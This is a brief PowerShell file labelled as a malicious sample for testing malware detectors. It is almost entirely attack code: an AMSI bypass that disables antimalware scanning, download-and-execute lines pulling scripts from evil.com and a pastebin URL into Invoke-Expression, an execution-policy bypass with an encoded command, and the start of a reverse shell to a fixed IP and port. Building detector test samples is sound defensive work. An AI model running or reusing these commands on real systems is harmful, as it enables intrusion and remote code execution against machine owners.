# MALICIOUS TEST SAMPLE — DO NOT RUN.
# PowerShell dropper for testing detectors.

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Download and execute
$wc = New-Object Net.WebClient
$payload = $wc.DownloadString("http://evil.com/payload.ps1")
Invoke-Expression $payload

# Encoded command execution
powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA

# Alternative IEX download
IEX (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/malware")

# Reverse shell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3", 4444);
